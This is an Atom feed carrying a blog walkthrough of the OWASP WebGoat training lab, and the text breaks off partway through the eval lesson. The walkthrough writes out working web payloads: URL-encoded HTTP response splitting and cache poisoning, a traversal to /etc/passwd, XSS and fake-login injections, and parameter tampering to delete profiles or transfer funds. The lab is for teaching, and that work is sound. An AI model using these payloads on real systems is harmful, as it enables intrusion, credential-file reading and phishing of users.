@@ -1,0 +1,2228 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: web | Core dump overflow]]></title>
+  <link href="http://chousensha.github.io/blog/categories/web/atom.xml" rel="self"/>
+  <link href="http://chousensha.github.io/"/>
+  <updated>2015-08-03T14:05:34+03:00</updated>
+  <id>http://chousensha.github.io/</id>
+  <author>
+    <name><![CDATA[chousensha]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - WebGoat]]></title>
+    <link href="http://chousensha.github.io/blog/2014/08/15/pentest-lab-webgoat/"/>
+    <updated>2014-08-15T23:17:44+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/08/15/pentest-lab-webgoat</id>
+    <content type="html"><![CDATA[<p>The next target in my web penetration testing series will be WebGoat. So, what is WebGoat?</p>
+
+<!-- more -->
+
+
+<blockquote><p>WebGoat is a deliberately insecure web application maintained by OWASP designed to
+teach web application security lessons. In each lesson, users must demonstrate their
+understanding of a security issue by exploiting a real vulnerability in the WebGoat
+applications. The application is a realistic teaching environment, providing users
+with hints and code to further explain the lesson.</p></blockquote>
+
+<p>I used the standard install that contains the Java Runtime Environment and Tomcat server, in addition to the web application itself. If you follow the installation instructions you should be fine, but in case you get a <em>Please set JAVA_HOME to a Java 1.6 JDK install</em> message, remember to point the environment variable to your Java JDK location. In my case, it looked like this: <code>export JAVA_HOME=/usr/lib/jvm/java-6-openjdk-amd64</code></p>
+
+<p>Then navigate to <a href="http://localhost:8080/WebGoat/attack">http://localhost:8080/WebGoat/attack</a> (or whatever port you used to start it on). The credentials are <em>guest/guest</em>. You can see from the menu that there are many attack categories. So, let&rsquo;s begin!</p>
+
+<h3>General</h3>
+
+<p><strong>HTTP Basics</strong></p>
+
+<p><img class="center" src="/images/webgoat/http_basics.png" title="&lsquo;http basics&rsquo; &lsquo;http basics&rsquo;" ></p>
+
+<p><strong>Concept / Topic To Teach:</strong></p>
+
+<p>This lesson presents the basics for understanding the transfer of data between the browser and the web application.</p>
+
+<p><strong>How HTTP works:</strong></p>
+
+<p>All HTTP transactions follow the same general format. Each client request and server response has three parts: the request or response line, a header section, and the entity body. The client initiates a transaction as follows:</p>
+
+<p>The client contacts the server and sends a document request</p>
+
+<p><em>GET /index.html?param=value HTTP/1.0</em></p>
+
+<p>Next, the client sends optional header information to inform the server of its configuration and the document formats it will accept.</p>
+
+<p><em>User-Agent: Mozilla/4.06 Accept: image/gif,image/jpeg, <em>/</em></em></p>
+
+<p>After sending the request and headers, the client may send additional data. This data is mostly used by CGI programs using the POST method.</p>
+
+<p><strong>My solution</strong></p>
+
+<p>Well, nothing fancy here. Just enter something in the text box. This is just a warmup.</p>
+
+<p><strong>HTTP Splitting</strong></p>
+
+<p><img class="center" src="/images/webgoat/http_split.png" title="&lsquo;http splitting&rsquo; &lsquo;http splitting&rsquo;" ></p>
+
+<p><strong>Concept / Topic To Teach:</strong></p>
+
+<p>This lesson teaches how to perform HTTP Splitting attacks.</p>
+
+<p><strong>How the attack works:</strong></p>
+
+<p>The attacker passes malicious code to the web server together with normal input. A victim application will not be checking for CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n) characters. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but they also allow them to create additional responses entirely under their control.</p>
+
+<p>The effect of an HTTP Splitting attack is maximized when accompanied with a Cache Poisoning. The goal of Cache Poisoning attack is to poison the cache of the victim by fooling the cache into believing that the page hijacked using the HTTP splitting is an authentic version of the server&rsquo;s copy.</p>
+
+<p>The attack works by using the HTTP Splitting attack plus adding the <strong>Last-Modified:</strong> header and setting it to a future date. This forces the browser to send an incorrect <strong>If-Modified-Since</strong> request header on future requests. Because of this, the server will always report that the (poisoned) page has not changed, and the victim&rsquo;s browser will continue to display the attacked version of the page.</p>
+
+<p>A sample of a 304 response is:</p>
+
+<p><em>HTTP/1.1 304 Not Modified</em>
+<em>Date: Fri, 30 Dec 2005 17:32:47 GMT</em></p>
+
+<p><strong>My solution</strong></p>
+
+<p><a href="https://www.owasp.org/index.php/HTTP_Response_Splitting"><strong>Stage 1 attack</strong></a></p>
+
+<blockquote><p>HTTP response splitting occurs when:</p>
+
+<ul>
+<li>Data enters a web application through an untrusted source, most frequently an HTTP request.</li>
+<li>The data is included in an HTTP response header sent to a web user without being validated for malicious characters.</li>
+</ul>
+
+
+<p>HTTP response splitting is a means to an end, not an end in itself. At its root, the attack is straightforward: an attacker passes
+malicious data to a vulnerable application, and the application includes the data in an HTTP response header.</p>
+
+<p>To mount a successful exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF
+(line feed, also given by %0a or \n)characters into the header AND the underlying platform must be vulnerable to the injection of such
+characters. These characters not only give attackers control of the remaining headers and body of the response the application intends
+to send, but also allow them to create additional responses entirely under their control.</p></blockquote>
+
+<p>I entered <code>en%0a</code> in the box and looked at the response headers, which look like this:</p>
+
+<p>HTTP/1.1 302 Moved Temporarily<br/>
+Server: Apache-Coyote/1.1<br/>
+Location: <a href="http://localhost:8080/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=en%0a  ">http://localhost:8080/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=en%0a  </a>
+Content-Type: text/html;charset=ISO-8859-1<br/>
+Content-Length: 0<br/>
+Date: Fri, 15 Aug 2014 22:01:57 GMT</p>
+
+<p>There is no input sanitization. Note the <strong>Content-Length: 0</strong> header, which signals the end of the first request. After this header, I can add arbitrary headers. For stage 1, it looks like this:</p>
+
+<p>``` plain
+Content-Length: 0</p>
+
+<p>HTTP/1.1 200 OK<br/>
+Content-Type: text/html<br/>
+Content-Length: 50<br/>
+<html><body>Stage 1 pwned!</body></html>
+```</p>
+
+<p>Just typing the headers in the box won&rsquo;t work for the attack, you have to URL encode it. The encoded version is:</p>
+
+<p><code>Content-Length%3A+0%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0AContent-Length%3A+50%0D%0A%3Chtml%3E%3Cbody%3EStage+1+pwned%21%3C%2Fbody%3E%3C%2Fhtml%3E</code>.</p>
+
+<p>That concludes the first part of the attack.</p>
+
+<p><a href="https://www.owasp.org/index.php/Cache_Poisoning"><strong>Stage 2 overview</strong></a></p>
+
+<blockquote><p>The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even
+the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then
+all users of that cache will continue to receive the malicious content until the cache entry is purged. Similarly, if the response is
+cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is
+purged, although only the user of the local browser instance will be affected.</p>
+
+<p>To successfully carry out such an attack, an attacker:</p>
+
+<ul>
+<li>Finds the vulnerable service code, which allows them to fill the HTTP header field with many headers.</li>
+<li>Forces the cache server to flush its actual cache content, which we want to be cached by the servers.</li>
+<li>Sends a specially crafted request, which will be stored in cache.</li>
+<li>Sends the next request. The previously injected content stored in cache will be the response to this request.</li>
+</ul>
+
+
+<p>A Cache Poisoning attack is possible because of HTTP Response Splitting and flaws in the web application. It is crucial from the
+attacker&rsquo;s point of view that the application allows for filling the header field with more than one header using CR (Carrige Return)
+and LF (Line Feed) characters.</p></blockquote>
+
+<p>For the next part, we have to modify the <strong>Last-Modified</strong> header and setting it to a date in the future, to force the browser to cache the malicious page.</p>
+
+<p>``` plain
+Content-Length: 0</p>
+
+<p>HTTP/1.1 200 OK<br/>
+Content-Type: text/html<br/>
+Last-Modified: Mon, 01 Aug 3000 00:00:00 GMT<br/>
+Content-Length: 50<br/>
+<html><body>Stage 1 pwned!</body></html>
+```</p>
+
+<p>Again, URL encode it:</p>
+
+<p><code>Content-Length%3A+0%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0ALast-Modified%3A+Mon%2C+01+Aug+3000+00%3A00%3A00+GMT%0D%0AContent-Length%3A+50%0D%0A%3Chtml%3E%3Cbody%3EStage+1+pwned%21%3C%2Fbody%3E%3C%2Fhtml%3E</code></p>
+
+<p>And stage 2 is complete!</p>
+
+<h3>Access Control Flaws</h3>
+
+<p><strong>Using an Access Control Matrix</strong></p>
+
+<p><img class="center" src="/images/webgoat/ac_matrix.png" title="&lsquo;access control matrix&rsquo; &lsquo;access control matrix&rsquo;" ></p>
+
+<p> User Larry [User, Manager] was allowed to access resource Account Manager</p>
+
+<p><strong>Bypass a Path Based Access Control Scheme</strong></p>
+
+<p><img class="center" src="/images/webgoat/bypass_ac.png" title="&lsquo;bypass ac&rsquo; &lsquo;bypass ac&rsquo;" ></p>
+
+<p><strong>Concept / Topic To Teach:</strong></p>
+
+<p>In a path based access control scheme, an attacker can traverse a path by providing relative path information. Therefore an attacker can use relative paths to access files that normally are not directly accessible by anyone, or would otherwise be denied if requested directly.</p>
+
+<p><strong>My solution</strong></p>
+
+<p>Choose a file from the list and intercept the request. Then modify it to access a different file. I changed <code>File=FailOpenAuthentication.html&amp;SUBMIT=View+File</code> to <code>File=../../../../../../../../../etc/passwd&amp;SUBMIT=View+File</code></p>
+
+<p><strong>LAB: Role Based Access Control</strong></p>
+
+<p><img class="center" src="/images/webgoat/rbac_stage1.png" title="&lsquo;bypass rbac&rsquo; &lsquo;bypass rbac&rsquo;" ></p>
+
+<p><strong>Concept / Topic To Teach:</strong></p>
+
+<p>In role-based access control scheme, a role represents a set of access permissions and privileges. A user can be assigned one or more roles. A role-based access control normally consists of two parts: role permission management and role assignment. A broken role-based access control scheme might allow a user to perform accesses that are not allowed by his/her assigned roles, or somehow obtain unauthorized roles.</p>
+
+<p><strong>General Goal(s):</strong></p>
+
+<p>Your goal is to explore the access control rules that govern this site. Each role has permission to certain resources (A-F). Each user is assigned one or more roles. Only the user with the [Admin] role should have access to the &lsquo;F&rsquo; resources. In a successful attack, a who user doesn&rsquo;t have the [Admin] role can access resource F.</p>
+
+<p><strong>Stage 1 Bypass Business Layer Access Control.</strong></p>
+
+<p>I logged in as Tom and looked at the request headers when choosing the action ViewProfile. It looks like this: <code>employee_id=105&amp;action=ViewProfile</code>. So, how might a delete profile action look like? I replayed the request with this very creative modification: <code>employee_id=105&amp;action=DeleteProfile</code>. And that&rsquo;s it for Stage 1!</p>
+
+<p><strong>Stage 2: Add Business Layer Access Control.</strong></p>
+
+<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>
+
+<p>Implement a fix to deny unauthorized access to the Delete function. To do this, you will have to alter the WebGoat code. Once you have done this, repeat stage 1 and verify that access to DeleteProfile functionality is properly denied.</p>
+
+<p>I will skip the exercises that require the developer version, since I&rsquo;m using the standard version.</p>
+
+<p><strong>Stage 3: Bypass Data Layer Access Control</strong></p>
+
+<p>As regular employee &lsquo;Tom&rsquo;, exploit weak access control to View another employee&rsquo;s profile. Verify the access.</p>
+
+<p>This time, modify the <em>employee_id</em> field to view a different profile: <code>employee_id=111&amp;action=ViewProfile</code></p>
+
+<p><strong>Stage 4: Add Data Layer Access Control</strong></p>
+
+<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>
+
+<p>Implement a fix to deny unauthorized access to this data. Once you have done this, repeat stage 3, and verify that access to other employee&rsquo;s profiles is properly denied.</p>
+
+<p><strong>Remote Admin Access</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong></p>
+
+<p>Applications will often have an administrative interface that allows privileged users access to functionality that normal users shouldn&rsquo;t see. The application server will often have an admin interface as well.</p>
+
+<p><strong>General Goal(s):</strong></p>
+
+<p>Try to access the administrative interface for WebGoat. You may also try to access the administrative interface for Tomcat. The Tomcat admin interface can be accessed via a URL (/admin) and will not count towards the completion of this lesson.</p>
+
+<p>If you look at Admin Functions in the menu, you should only see the Report Card function. Append <code>&amp;admin=true</code> to the URL, and you will see more functions.</p>
+
+<h3>AJAX Security</h3>
+
+<p><strong>Same Origin Policy Protection</strong></p>
+
+<p><img class="center" src="/images/webgoat/sop.png" title="&lsquo;same origin policy&rsquo; &lsquo;same origin policy&rsquo;" ></p>
+
+<p><strong>Concept / Topic To Teach:</strong></p>
+
+<p>A key element of AJAX is the XMLHttpRequest (XHR), which allows javascript to make asynchronous calls from the client side to a server. However, as a security measure these requests may only be made to the server from which the client page originated.</p>
+
+<p>Try the requests for both the same origin and different origin.</p>
+
+<p><strong>LAB: DOM-Based cross-site scripting</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong></p>
+
+<p>The Document Object Model (DOM) presents an interesting problem from a security standpoint. It allows the content of a web page to be dynamically modified, but that can be abused by attackers during a malicious code injection. XSS, a type of malicious code injection, can occur when unvalidated user input is used directly to modify the content of a page on the client side.</p>
+
+<p><strong>General Goal(s):</strong></p>
+
+<p>For this exercise, your mission is to use this vulnerability to inject malicious code into the DOM. Then in the last stage, you will correct the flaws in the code to address the vulnerability.</p>
+
+<p><img class="center" src="/images/webgoat/img_deface.png" title="&lsquo;dom xss stage 1&rsquo; &lsquo;dom xss stage 1&rsquo;" ></p>
+
+<p>The image location is at <a href="http://localhost:8080/WebGoat/images/logos/owasp.jpg.">http://localhost:8080/WebGoat/images/logos/owasp.jpg.</a> To deface the page, the injection looks like this:</p>
+
+<p><code>html
+&lt;img src="images/logos/owasp.jpg"/&gt;
+</code></p>
+
+<p>You will notice the Hello message, followed by the OWASP image.</p>
+
+<p><strong>STAGE 2</strong></p>
+
+<p> Now, try to create a JavaScript alert using the image tag</p>
+
+<p>For this attack, we have to use the <em>onerror</em> event, which is triggered if an error occurs when loading an image. And of course, make sure there is no valid image so the error can happen:</p>
+
+<p><code>html
+&lt;img src="no img" onerror="alert('There is no image, just XSS')"/&gt;
+</code></p>
+
+<p><strong>STAGE 3</strong></p>
+
+<p>Next, try to create a JavaScript alert using the IFRAME tag.</p>
+
+<p>The <em>iframe</em> tag specifies an inline frame, which is used to embed another document within the current HTML document. The attack looks like this:</p>
+
+<p>``` html</p>
+
+<iframe src="javascript:alert('You've been framed!');"></iframe>
+
+
+<p>```</p>
+
+<p><strong>STAGE 4</strong></p>
+
+<p>Use the following to create a fake login form:</p>
+
+<p><code>plain
+Please enter your password:&lt;BR&gt;&lt;input type = "password" name="pass"/&gt;&lt;button onClick="javascript:alert('I have your password: ' + pass.value);"&gt;Submit&lt;/button&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;
+</code></p>
+
+<p>Now enter something in the box, and you will see it alerted back.</p>
+
+<p><strong>STAGE 5</strong></p>
+
+<p>Perform client-side HTML entity encoding to mitigate the DOM XSS vulnerability. A utility method is provided for you in escape.js.</p>
+
+<p>Look in the page source for escape.js. Inside you will find the following function:</p>
+
+<p><code>js
+function escapeHTML (str) {
+   var div = document.createElement('div');
+   var text = document.createTextNode(str);
+   div.appendChild(text);
+   return div.innerHTML;
+}
+</code></p>
+
+<p>In Firebug, look at DOMXSS.js. We have to modify this function:</p>
+
+<p>``` js
+function displayGreeting(name) {</p>
+
+<pre><code>if (name != ''){
+    document.getElementById("greeting").innerHTML="Hello, " + name+ "!";
+}
+</code></pre>
+
+<p>}
+```</p>
+
+<p>to use the escapeHTML function on the name parameter:</p>
+
+<p><code>js
+document.getElementById("greeting").innerHTML="Hello, " + escapeHTML(name)+ "!";
+</code></p>
+
+<p>To make the modification, I edited the Javascript file, located in my WebGoat directory, at <code>tomcat/webapps/WebGoat/javascript</code></p>
+
+<p><strong>LAB: Client Side Filtering</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+It is always a good practice to send to the client only information which they are supposed to have access to. In this lesson, too much information is being sent to the client, creating a serious access control problem.</p>
+
+<p><strong>General Goal(s):</strong>
+For this exercise, your mission is exploit the extraneous information being returned by the server to discover information to which you should not have access.</p>
+
+<p><img class="center" src="/images/webgoat/client_filter.png" title="&lsquo;client side filtering&rsquo; &lsquo;client side filtering&rsquo;" ></p>
+
+<p>Inspect the source with Firebug, and you will notice a hidden table called <em>hiddenEmployeeRecords</em>. Look at the last id (112), and you will find out Bartholomew&rsquo;s salary is 450000.</p>
+
+<p><strong>STAGE 2:</strong></p>
+
+<p>Now, fix the problem. Modify the server to only return results that Moe Stooge is allowed to see.</p>
+
+<p>Again, this will require the modification of a file. Look in <code>tomcat/webapps/WebGoat/lessons/Ajax</code>. In the <em>employees.xml</em> file, every employee has a <em>Managers</em> property, that shows which manager should have access over that employee&rsquo;s records. Looking at Neville Bartholomew&rsquo;s profile, we see only he can access his information:</p>
+
+<p>``` xml
+<Employee></p>
+
+<pre><code>    &lt;UserID&gt;112&lt;/UserID&gt;
+    &lt;FirstName&gt;Neville&lt;/FirstName&gt;
+    &lt;LastName&gt;Bartholomew&lt;/LastName&gt;
+    &lt;Street&gt;1 Corporate Headquarters&lt;/Street&gt;
+    &lt;CS&gt;San Jose, CA&lt;/CS&gt;
+    &lt;Phone&gt;408-587-0024&lt;/Phone&gt;
+    &lt;StartDate&gt;3012000&lt;/StartDate&gt;
+    &lt;SSN&gt;111-111-1111&lt;/SSN&gt;
+    &lt;Salary&gt;450000&lt;/Salary&gt;
+    &lt;CreditCard&gt;4803389267684109&lt;/CreditCard&gt;
+    &lt;Limit&gt;300&lt;/Limit&gt;
+    &lt;Comments&gt;&lt;/Comments&gt;
+    &lt;DisciplinaryExplanation&gt;&lt;/DisciplinaryExplanation&gt;
+    &lt;DisciplinaryDate&gt;112005&lt;/DisciplinaryDate&gt;        
+    &lt;Managers&gt;
+    &lt;Manager&gt;112&lt;/Manager&gt;
+&lt;/Managers&gt;
+</code></pre>
+
+<p></Employee>
+```</p>
+
+<p>Next, look at <em>clientSideFiltering.jsp</em>. I am not proficient with XPath, but here is the relevant bit:</p>
+
+<p>``` xml
+StringBuffer sb = new StringBuffer();</p>
+
+<p>sb.append(&ldquo;/Employees/Employee/UserID | &rdquo;);
+sb.append(&ldquo;/Employees/Employee/FirstName | &rdquo;);
+sb.append(&ldquo;/Employees/Employee/LastName | &rdquo;);
+sb.append(&ldquo;/Employees/Employee/SSN | &rdquo;);
+sb.append(&ldquo;/Employees/Employee/Salary &rdquo;);</p>
+
+<p>String expression = sb.toString();
+```</p>
+
+<p>We have to change it so the information returned corresponds with the access rights that only managers should have over specific employee records. The filter looks like this:</p>
+
+<p><code>xml
+sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/UserID | ");
+sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/FirstName | ");
+sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/LastName | ");
+sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/SSN | ");
+sb.append("/Employees/Employee[Managers/Manager/text() = " + userId + "]/Salary ");
+</code></p>
+
+<p>If I understand it right, this filter ensures that information is returned only if the user id is present in the Manager node. For example, in Bartholomew&rsquo;s case, it should enforce the fact that only user id 112 can access his records. In other words, only Bartholomew himself can view his information.</p>
+
+<p>For this, I looked at the solution provided by WebGoat, while searching some more about XPath syntax.</p>
+
+<p><strong>DOM Injection</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+How to perform DOM injection attacks.</p>
+
+<p><strong>How the attack works:</strong>
+Some applications, especially the ones that use AJAX, manipulate and update the DOM directly using javascript, DHTML and eval() methods.
+An attacker may take advantage of that by intercepting the reply and trying to inject some javascript commands to exploit the vulnerabilities.</p>
+
+<p><img class="center" src="/images/webgoat/dom_injection.png" title="&lsquo;dom injection&rsquo; &lsquo;dom injection&rsquo;" ></p>
+
+<p>In Firebug, I just changed the Activate button below:</p>
+
+<p><code>html
+&lt;input id="SUBMIT" type="SUBMIT" name="SUBMIT" value="Activate!" disabled=""&gt;
+</code></p>
+
+<p>to &ldquo;enabled&rdquo;, then clicked it.</p>
+
+<p><strong>XML Injection</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches how to perform XML Injection attacks.</p>
+
+<p><strong>How the attack works:</strong>
+AJAX applications use XML to exchange information with the server. This XML can be easily intercepted and altered by a malicious attacker.</p>
+
+<p><img class="center" src="/images/webgoat/xml_injection.png" title="&lsquo;xml injection&rsquo; &lsquo;xml injection&rsquo;" ></p>
+
+<p>When you enter your account id, you will see the rewards that you can claim:</p>
+
+<p>``` plain
+Your account balance is now 100 points</p>
+
+<p>Rewards</p>
+
+<p>WebGoat Mug 20 Pts
+WebGoat t-shirt 50 Pts
+WebGoat Secure Kettle 30 Pts
+```</p>
+
+<p>This exercise requires a proxy, so I will use WebScarab to capture the requests and responses. The response from the server contains the following:</p>
+
+<p><code>xml
+&lt;root&gt;
+&lt;reward&gt;WebGoat Mug 20 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat t-shirt 50 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt;
+&lt;/root&gt;
+</code></p>
+
+<p>This means it&rsquo;s only a matter of adding the other rewards to the response, so it becomes this:</p>
+
+<p><code>xml
+&lt;root&gt;
+&lt;reward&gt;WebGoat t-shirt 20 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Secure Kettle 50 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Mug 30 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Core Duo Laptop 2000 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Hawaii Cruise 3000 Pts&lt;/reward&gt;
+&lt;/root&gt;
+</code></p>
+
+<p>Do that in WebScarab a couple of times and you will see them available on the page. I took the laptop!</p>
+
+<p><strong>JSON Injection</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches how to perform JSON Injection Attacks.</p>
+
+<p><strong>How the attack works:</strong>
+JavaScript Object Notation (JSON) is a simple and effective lightweight data exchange format. JSON can be in a lot of forms such as arrays, lists, hashtables and other data structures. JSON is widely used in AJAX and Web2.0 applications and is favored by programmers over XML because of its ease of use and speed. However, JSON, like XML, is prone to Injection attacks. A malicious attacker can inject the reply from the server and inject some arbitrary values in there.</p>
+
+<p><img class="center" src="/images/webgoat/json_injection.png" title="&lsquo;json injection&rsquo; &lsquo;json injection&rsquo;" ></p>
+
+<p>Intercept the response and modify the no stops flight in the following JSON to a lower price:</p>
+
+<p><code>json
+{
+"From": "Boston",
+"To": "Seattle",
+"flights": [
+{"stops": "0", "transit" : "N/A", "price": "$600"},
+{"stops": "2", "transit" : "Newark,Chicago", "price": "$300"}
+]
+}
+</code></p>
+
+<p>Then selecy your now very cheap flight and you&rsquo;re done.</p>
+
+<p><strong>Silent Transactions Attacks</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches how to perform silent transactions attacks.</p>
+
+<p><strong>How the attack works:</strong>
+Any system that silently processes transactions using a single submission is dangerous to the client. For example, if a normal web application allows a simple URL submission, a preset session attack will allow the attacker to complete a transaction without the user&rsquo;s authorization. In Ajax, it gets worse: the transaction is silent; it happens with no user feedback on the page, so an injected attack script may be able to steal money from the client without authorization.</p>
+
+<p><img class="center" src="/images/webgoat/silent.png" title="&lsquo;silent transaction attack&rsquo; &lsquo;silent transaction attack&rsquo;" ></p>
+
+<p>Find the following Javascript code in the source:</p>
+
+<p>`&ldquo; js
+function processData(){
+ var accountNo = document.getElementById(&lsquo;newAccount&rsquo;).value;
+ var amount = document.getElementById(&lsquo;amount&rsquo;).value;
+ if ( accountNo == &rdquo;){
+ alert(&lsquo;Please enter a valid account number to transfer to.&rsquo;)
+ return;
+}
+ else if ( amount == &lsquo;&rsquo;){
+ alert(&lsquo;Please enter a valid amount to transfer.&rsquo;)
+ return;
+}
+ var balanceValue = document.getElementById(&lsquo;balanceID&rsquo;).innerHTML;
+ balanceValue = balanceValue.replace( new RegExp(&lsquo;$&rsquo;) , &lsquo;&rsquo;);
+ if ( parseFloat(amount) > parseFloat(balanceValue) ) {
+ alert(&lsquo;You can not transfer more funds than what is available in your balance.&rsquo;)
+ return;
+}
+ document.getElementById(&lsquo;confirm&rsquo;).value  = &lsquo;Transferring&rsquo;
+submitData(accountNo, amount);
+ document.getElementById(&lsquo;confirm&rsquo;).value  = &lsquo;Confirm&rsquo;
+balanceValue = parseFloat(balanceValue) &ndash; parseFloat(amount);
+balanceValue = balanceValue.toFixed(2);
+document.getElementById(&lsquo;balanceID&rsquo;).innerHTML = balanceValue + &lsquo;$&rsquo;;
+}
+function submitData(accountNo, balance) {
+var url = &lsquo;attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=&rsquo;+ accountNo+ &lsquo;&amp;amount=&rsquo; + balance +&lsquo;&amp;confirm=&rsquo; + document.getElementById(&lsquo;confirm&rsquo;).value;
+if (typeof XMLHttpRequest != &lsquo;undefined&rsquo;) {
+req = new XMLHttpRequest();
+} else if (window.ActiveXObject) {
+req = new ActiveXObject(&lsquo;Microsoft.XMLHTTP&rsquo;);
+   }
+   req.open(&lsquo;GET&rsquo;, url, true);
+   req.onreadystatechange = callback;
+   req.send(null);
+}
+function callback() {</p>
+
+<pre><code>if (req.readyState == 4) { 
+    if (req.status == 200) { 
+               var result =  req.responseText ;
+         var resultsDiv = document.getElementById('resultsDiv');
+            resultsDiv.innerHTML = '';
+            resultsDiv.innerHTML = result;
+    }}}
+</code></pre>
+
+<p>```</p>
+
+<p>The function <em>processData</em> performs some validation, such as correct account number, valid amount and balance. If all is well, it calls <em>submitData</em>, which is the function that does the transaction. The following line is the key to performing the attack:</p>
+
+<p><code>js
+var url = 'attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount='+ accountNo+ '&amp;amount=' + balance +'&amp;confirm=' + document.getElementById('confirm').value;
+</code></p>
+
+<p>Then all we need to do is construct a URL like that with our chosen parameters:</p>
+
+<p><code><a href="http://localhost:8080/WebGoat/attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=83&amp;amount=20000&amp;confirm=Confirm">http://localhost:8080/WebGoat/attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=83&amp;amount=20000&amp;confirm=Confirm</a></code></p>
+
+<p>Another way would be to use Javascript in the browser to call the function <em>submitData</em> directly with arbitrary values:</p>
+
+<p><code>plain
+javascript:submitData(83,20000);
+</code></p>
+
+<p>In my Firefox version, I couldn&rsquo;t use Javascript from the URL bar, so I used Scratchpad instead from the Web Developer tools.</p>
+
+<p><strong>Dangerous Use of Eval</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is reflected directly into an HTTP response. In this lesson, unvalidated user-supplied data is used in conjunction with a Javascript eval() call. In a reflected XSS attack, an attacker can craft a URL with the attack script and store it on another website, email it, or otherwise trick a victim into clicking on it.</p>
+
+<p><img class="center" src="/images/webgoat/eval.png" title="&lsquo;eval danger&rsquo; &lsquo;eval&rsquo;" ></p>
+
+<p>At first I was stuck because I couldn&rsquo;t quite grasp what the code was doing and where was the vulnerability, so I looked at the solution and worked backwards from there, and it became clearer, or at least I think it did.</p>
+
+<p>The first thing I did was look at the <code>eval.js</code> code. And below is the important part.</p>
+
+<p>``` js
+http_request.onreadystatechange = function() {
+if(http_request.readyState == 4) {
+var status = http_request.status;
+var responseText = http_request.responseText;</p>
+
+<p>//alert(&lsquo;status: &rsquo; + status);
+//alert(&lsquo;responseText: &rsquo; + responseText);</p>
+
+<p>eval(http_request.responseText);</p>
+
+<p>if(responseText.indexOf(&ldquo;&lsquo;);&rdquo;) != -1
+&amp;&amp; responseText.indexOf(&ldquo;alert&rdquo;) != -1
+&amp;&amp; responseText.indexOf(&ldquo;document.cookie&rdquo;) != -1){</p>
+
+<p>document.form.submit();
+}</p>
+
+<p>}
+};
+```</p>
+
+<p>And in the <code>eval.jsp</code> file:</p>
+
+<p>``` js
+String action = request.getParameter(&ldquo;action&rdquo;);
+String field1 = request.getParameter(&ldquo;field1&rdquo;);
+String field2 = request.getParameter(&ldquo;field2&rdquo;);</p>
+
+<p>if(action == null) action = &ldquo;Purchase&rdquo;;
+if(field1 == null) field1 = &ldquo;123&rdquo;;
+if(field2 == null) field2 = &ldquo;-1&rdquo;;</p>
+
+<p>/<strong> If they supplied the right attack, pass them </strong>/
+if(field1.indexOf(&ldquo;&lsquo;);&rdquo;) != -1 &amp;&amp; field1.indexOf(&ldquo;alert&rdquo;) != -1 &amp;&amp; field1.indexOf(&ldquo;document.cookie&rdquo;) != -1)</p>
+
+<p>{
+session.setAttribute(DangerousEval.PASSED, &ldquo;true&rdquo;);
+}</p>
+
+<p>out.write(&ldquo;alert(&lsquo;Whoops: You entered an incorrect access code of \&rdquo;&ldquo; + field1 + &rdquo;\&ldquo;&rsquo;);&rdquo;);
+```</p>
+
+<p>First, some clarification to help understand the code:</p>
+
+<ul>
+<li><p>The <strong>XMLHttpRequest</strong> object is used to exchange data with a server behind the scenes, and it is heavily used in AJAX programming</p></li>
+<li><p><strong>responseText</strong> is a property of the <em>XMLHttpRequest</em> object that returns the body of the server&rsquo;s response as a string.</p></li>
+<li><p>The <strong>indexOf()</strong> method returns the position of the first occurrence of a specified value in a string. This method returns -1 if the value to search for never occurs. Its syntax is <code>string.indexOf(searchvalue,start)</code>. The second parameter is optional, in case you want to give a position from where to start the search.</p></li>
+<li><p><em>field1</em> refers to the box with the 3 digit access code</p></li>
+</ul>
+
+
+<p>In light of this information, let&rsquo;s look again at this code:</p>
+
+<p><code>js
